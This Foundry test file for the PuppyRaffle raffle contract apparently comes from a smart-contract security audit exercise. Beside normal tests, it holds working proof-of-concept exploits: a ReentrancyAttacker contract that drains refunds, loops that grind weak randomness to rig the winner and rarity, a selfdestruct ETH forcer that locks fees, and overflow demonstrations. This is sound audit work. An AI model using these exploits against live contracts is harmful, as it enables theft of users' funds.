// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console, console2} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract PuppyRaffleTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address playerOne = address(1);
    address playerTwo = address(2);
    address playerThree = address(3);
    address playerFour = address(4);
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
    }

    //////////////////////
    /// EnterRaffle    ///
    /////////////////////

    function testCanEnterRaffle() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        assertEq(puppyRaffle.players(0), playerOne);
    }

    function testCantEnterWithoutPaying() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
        puppyRaffle.enterRaffle(players);
    }

    function testCanEnterRaffleMany() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
        assertEq(puppyRaffle.players(0), playerOne);
        assertEq(puppyRaffle.players(1), playerTwo);
    }

    function testCantEnterWithoutPayingMultiple() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
        puppyRaffle.enterRaffle{value: entranceFee}(players);
    }

    function testCantEnterWithDuplicatePlayers() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerOne;
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
    }

    function testCantEnterWithDuplicatePlayersMany() public {
        address[] memory players = new address[](3);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerOne;
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);
    }

    //////////////////////
    /// Refund         ///
    /////////////////////
    modifier playerEntered() {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        _;
    }

    function testCanGetRefund() public playerEntered {
        uint256 balanceBefore = address(playerOne).balance;
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);

        vm.prank(playerOne);
        puppyRaffle.refund(indexOfPlayer);

        assertEq(address(playerOne).balance, balanceBefore + entranceFee);
    }

    function testGettingRefundRemovesThemFromArray() public playerEntered {
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);

        vm.prank(playerOne);
        puppyRaffle.refund(indexOfPlayer);

        assertEq(puppyRaffle.players(0), address(0));
    }

    function testOnlyPlayerCanRefundThemself() public playerEntered {
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);
        vm.expectRevert("PuppyRaffle: Only the player can refund");
        vm.prank(playerTwo);
        puppyRaffle.refund(indexOfPlayer);
    }

    //////////////////////
    /// getActivePlayerIndex         ///
    /////////////////////
    function testGetActivePlayerIndexManyPlayers() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);

        assertEq(puppyRaffle.getActivePlayerIndex(playerOne), 0);
        assertEq(puppyRaffle.getActivePlayerIndex(playerTwo), 1);
    }

    //////////////////////
    /// selectWinner         ///
    /////////////////////
    modifier playersEntered() {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        _;
    }

    function testCantSelectWinnerBeforeRaffleEnds() public playersEntered {
        vm.expectRevert("PuppyRaffle: Raffle not over");
        puppyRaffle.selectWinner();
    }

    function testCantSelectWinnerWithFewerThanFourPlayers() public {
        address[] memory players = new address[](3);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = address(3);
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        vm.expectRevert("PuppyRaffle: Need at least 4 players");
        puppyRaffle.selectWinner();
    }

    function testSelectWinner() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.previousWinner(), playerFour);
    }

    function testSelectWinnerGetsPaid() public playersEntered {
        uint256 balanceBefore = address(playerFour).balance;

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 expectedPayout = (((entranceFee * 4) * 80) / 100);

        puppyRaffle.selectWinner();
        assertEq(address(playerFour).balance, balanceBefore + expectedPayout);
    }

    function testSelectWinnerGetsAPuppy() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.balanceOf(playerFour), 1);
    }

    function testPuppyUriIsRight() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        string
            memory expectedTokenUri = "data:application/json;base64,eyJuYW1lIjoiUHVwcHkgUmFmZmxlIiwgImRlc2NyaXB0aW9uIjoiQW4gYWRvcmFibGUgcHVwcHkhIiwgImF0dHJpYnV0ZXMiOiBbeyJ0cmFpdF90eXBlIjogInJhcml0eSIsICJ2YWx1ZSI6IGNvbW1vbn1dLCAiaW1hZ2UiOiJpcGZzOi8vUW1Tc1lSeDNMcERBYjFHWlFtN3paMUF1SFpqZmJQa0Q2SjdzOXI0MXh1MW1mOCJ9";

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.tokenURI(0), expectedTokenUri);
    }

    //////////////////////
    /// withdrawFees         ///
    /////////////////////
    function testCantWithdrawFeesIfPlayersActive() public playersEntered {
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }

    function testWithdrawFees() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 expectedPrizeAmount = ((entranceFee * 4) * 20) / 100;

        puppyRaffle.selectWinner();
        puppyRaffle.withdrawFees();
        assertEq(address(feeAddress).balance, expectedPrizeAmount);
    }

    function test_DenialOfService_AUDIT() public {
        uint256 playersNum = 100;
        address[] memory players = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(i);
        }
        // check how much gas it costs for first 100 players
        uint256 gasBefore = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
        uint256 gasAfter = gasleft();
        uint256 gasUsedFirst = gasBefore - gasAfter;
        console2.log("Gas used for first 100 players:", gasUsedFirst);

        address[] memory playersTwo = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            playersTwo[i] = address(i + playersNum);
        }
        // check how much gas it costs for second 100 players
        uint256 gasBeforeTwo = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(
            playersTwo
        );
        uint256 gasAfterTwo = gasleft();
        uint256 gasUsedTwo = gasBeforeTwo - gasAfterTwo;
        console2.log("Gas used for second 100 players:", gasUsedTwo);

        console2.log("Gas Difference:::::", gasUsedTwo - gasUsedFirst);

        assert(gasUsedFirst < gasUsedTwo);
    }

    function test_ReEntrancy_AUDIT() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;

        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        ReentrancyAttacker attackerContract = new ReentrancyAttacker(
            puppyRaffle
        );
        address attackerAddress = makeAddr("attackerAddress");
        vm.deal(attackerAddress, 1 ether);

        uint256 startingAttackerContractBalance = address(attackerContract)
            .balance;
        uint256 startingRaffleBalance = address(puppyRaffle).balance;

        console2.log(
            "Starting Attacker Contract Balance:",
            startingAttackerContractBalance
        );

        console2.log(
            "Starting Raffle Contract Balance:",
            startingRaffleBalance
        );

        // attack
        vm.prank(attackerAddress);
        attackerContract.attack{value: entranceFee}();

        uint256 endingAttackerContractBalance = address(attackerContract)
            .balance;
        uint256 endingRaffleBalance = address(puppyRaffle).balance;

        console2.log(
            "Ending Attacker Contract Balance:",
            endingAttackerContractBalance
        );

        console2.log("Ending Raffle Contract Balance:", endingRaffleBalance);
    }

    function test_GetActivePlayerIndex_AUDIT() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);

        address notAPlayer = makeAddr("notAPlayer");

        uint256 indexOfRealPlayer = puppyRaffle.getActivePlayerIndex(playerOne);
        uint256 indexOfInactivePlayer = puppyRaffle.getActivePlayerIndex(
            notAPlayer
        );

        console2.log("Index of playerOne:", indexOfRealPlayer);
        console2.log("Index of inactive player:", indexOfInactivePlayer);

        // both return 0, so they are indistinguishable
        assertEq(indexOfRealPlayer, indexOfInactivePlayer);
        assertEq(puppyRaffle.players(0), playerOne);
    }

    // THIS TEST WAS WRITTEN BY DEEPSEEK HARNESS SO I CAN UNDERSTAND DEEPLY MYSELF
    function test_WeakRandomness_AUDIT() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        // the earliest moment the raffle is allowed to be drawn is
        // block.timestamp + duration. we add +1 to sit safely past that line
        uint256 startTime = block.timestamp + duration + 1;

        // a flag to remember whether we actually found a winning timestamp
        bool found;

        // this will store the timestamp that makes the attacker win
        uint256 winningTimestamp;

        // try 100 different timestamps, one second apart, starting at startTime
        for (uint256 t = startTime; t < startTime + 100; t++) {
            // this copies EXACTLY the line inside selectWinner():
            //   keccak256(msg.sender, block.timestamp, block.difficulty) % players.length
            // address(this) = the address calling selectWinner (this test contract)
            // t             = the timestamp we are trying right now
            // block.difficulty = the current difficulty value (not secret, publicly known)
            // keccak256(...) returns bytes32, so we cast it to uint256, then take % 4
            uint256 index = uint256(
                keccak256(abi.encodePacked(address(this), t, block.difficulty))
            ) % players.length;

            // index 3 means playerFour, which is the attacker
            if (index == 3) {
                // this timestamp gives the attacker the win, so remember it
                winningTimestamp = t;

                // flip the flag so we know we succeeded
                found = true;

                // no need to keep looping, we already have what we want
                break;
            }
        }

        // if found is still false, the attacker failed and the test should not pass
        assertTrue(found, "attacker found a winning timestamp");

        // move the chain forward to the timestamp the attacker hand-picked
        vm.warp(winningTimestamp);

        // mine a new block, so this looks like a real new block being produced
        vm.roll(block.number + 1);

        // print the timestamp that makes the attacker win
        console2.log("Winning timestamp found by attacker:", winningTimestamp);

        puppyRaffle.selectWinner();

        console2.log(
            "Winner is playerFour (the attacker):",
            puppyRaffle.previousWinner() == playerFour
        );
        assertEq(puppyRaffle.previousWinner(), playerFour);
    }

    // THIS TEST WAS WRITTEN BY DEEPSEEK HARNESS SO I CAN UNDERSTAND DEEPLY MYSELF
    function test_WeakRandomnessRarity_AUDIT() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        // the raffle has to be over before the draw, so this is the timestamp
        // the attacker will be executing at
        uint256 drawTime = block.timestamp + duration + 1;
        vm.warp(drawTime);
        vm.roll(block.number + 1);

        // the attacker does not even have to be a player, they only have to be
        // the caller, because msg.sender sits inside both hashes
        address attacker;
        uint256 winningIndex;
        uint256 chosenRarity;

        // grind over caller addresses until one of them picks playerFour as the
        // winner AND hands them a legendary puppy
        for (uint256 i = 0; i < 5000; i++) {
            address candidate = address(uint160(1000 + i));

            // these are the same two expressions used inside selectWinner()
            uint256 index = uint256(
                keccak256(
                    abi.encodePacked(candidate, drawTime, block.difficulty)
                )
            ) % players.length;
            uint256 rarity = uint256(
                keccak256(abi.encodePacked(candidate, block.difficulty))
            ) % 100;

            // index 3 is playerFour, rarity 96-99 is LEGENDARY_RARITY
            if (index == 3 && rarity > 95) {
                attacker = candidate;
                winningIndex = index;
                chosenRarity = rarity;
                break;
            }
        }

        assertTrue(
            attacker != address(0),
            "attacker found a caller for winner + legendary"
        );

        vm.prank(attacker);
        puppyRaffle.selectWinner();

        console2.log("caller address picked by attacker:", attacker);
        console2.log("winning index:", winningIndex);
        console2.log("rarity rolled by attacker:", chosenRarity);
        console2.log(
            "rarity stored on the minted token:",
            puppyRaffle.tokenIdToRarity(0)
        );

        assertEq(puppyRaffle.previousWinner(), playerFour);
        assertEq(puppyRaffle.tokenIdToRarity(0), 5);
    }

    function test_MishandlingOfETH_AUDIT() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();

        // after a normal draw the contract holds exactly the recorded fees, which is the only state where withdrawFees is allowed to run
        console2.log("totalFees recorded:", uint256(puppyRaffle.totalFees()));
        console2.log("raffle balance:", address(puppyRaffle).balance);
        assertEq(
            address(puppyRaffle).balance,
            uint256(puppyRaffle.totalFees())
        );

        // the contract has no receive or fallback, so the only way ETH gets in is by force feeding it with selfdestruct
        ETHForcer forcer = new ETHForcer{value: 1 ether}();
        forcer.attack(payable(address(puppyRaffle)));

        console2.log(
            "raffle balance after force feed:",
            address(puppyRaffle).balance
        );

        // the equality can never hold again, so the fees are stuck forever
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();

        assertGt(
            address(puppyRaffle).balance,
            uint256(puppyRaffle.totalFees())
        );
        console2.log("feeAddress balance:", address(feeAddress).balance);
        assertEq(address(feeAddress).balance, 0);
    }

    function test_LoopBasedMembershipCheck_AUDIT() public {
        address[] memory tenPlayers = new address[](10);
        for (uint256 i = 0; i < 10; i++) {
            tenPlayers[i] = address(uint160(1000 + i));
        }
        puppyRaffle.enterRaffle{value: entranceFee * 10}(tenPlayers);

        uint256 gasBefore = gasleft();
        puppyRaffle.getActivePlayerIndex(tenPlayers[9]);
        uint256 gasWithTenPlayers = gasBefore - gasleft();

        address[] memory morePlayers = new address[](90);
        for (uint256 i = 0; i < 90; i++) {
            morePlayers[i] = address(uint160(2000 + i));
        }
        puppyRaffle.enterRaffle{value: entranceFee * 90}(morePlayers);

        gasBefore = gasleft();
        puppyRaffle.getActivePlayerIndex(morePlayers[89]);
        uint256 gasWithHundredPlayers = gasBefore - gasleft();

        console2.log("gas with 10 players:", gasWithTenPlayers);
        console2.log("gas with 100 players:", gasWithHundredPlayers);
        console2.log(
            "Gas Difference:::::",
            gasWithHundredPlayers - gasWithTenPlayers
        );

        assert(gasWithHundredPlayers > gasWithTenPlayers);
    }

    function test_ArithmeticOverflow_AUDIT() public {
        // a separate raffle with a big entrance fee, so totalFees gets close to uint64 max
        uint256 bigEntranceFee = 1.5e19;
        PuppyRaffle bigRaffle = new PuppyRaffle(
            bigEntranceFee,
            feeAddress,
            duration
        );

        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;

        uint256 feePerRaffle = (4 * bigEntranceFee * 20) / 100;

        // raffle 1
        bigRaffle.enterRaffle{value: bigEntranceFee * 4}(players);
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        bigRaffle.selectWinner();
        console2.log(
            "totalFees after raffle 1:",
            uint256(bigRaffle.totalFees())
        );

        // raffle 2
        bigRaffle.enterRaffle{value: bigEntranceFee * 4}(players);
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        bigRaffle.selectWinner();
        console2.log(
            "totalFees after raffle 2:",
            uint256(bigRaffle.totalFees())
        );

        // the two fees should add up, but uint64 wraps around instead
        uint256 expectedWithoutOverflow = feePerRaffle * 2;
        console2.log("expected without overflow:", expectedWithoutOverflow);

        assertTrue(expectedWithoutOverflow > type(uint64).max);
        assertEq(bigRaffle.totalFees(), expectedWithoutOverflow - 2 ** 64);
    }

    function test_UnsafeCasting_AUDIT() public {
        uint256 playersNum = 100;
        address[] memory players = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(i + 100);
        }
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 expectedFee = (playersNum * entranceFee * 20) / 100;
        uint256 truncatedFee = uint256(uint64(expectedFee));

        puppyRaffle.selectWinner();

        console2.log("expected fee:", expectedFee);
        console2.log(
            "totalFees actually recorded:",
            uint256(puppyRaffle.totalFees())
        );

        // the fee is bigger than uint64 max, so the cast silently truncates it
        assertTrue(expectedFee > type(uint64).max);
        assertEq(uint256(puppyRaffle.totalFees()), truncatedFee);
    }
}

contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 attackerIndex;
    uint256 entranceFee;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = _puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }
    function _stealMoney() internal {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }
    fallback() external payable {
        _stealMoney();
    }
    receive() external payable {
        _stealMoney();
    }
}

contract ETHForcer {
    constructor() payable {}

    // selfdestruct pushes the whole balance into the target, and the target
    // cannot refuse it, even without a receive or fallback function
    function attack(address payable target) external {
        selfdestruct(target);
    }
}
